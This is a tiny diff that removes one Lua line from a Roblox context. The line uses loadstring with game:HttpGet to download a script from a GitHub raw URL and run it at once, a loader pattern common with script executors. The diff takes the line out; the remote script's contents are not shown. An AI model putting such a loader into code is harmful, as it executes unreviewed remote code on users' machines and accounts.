@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/milanifi/MilanifiScripts/main/kanava.lua", true))()
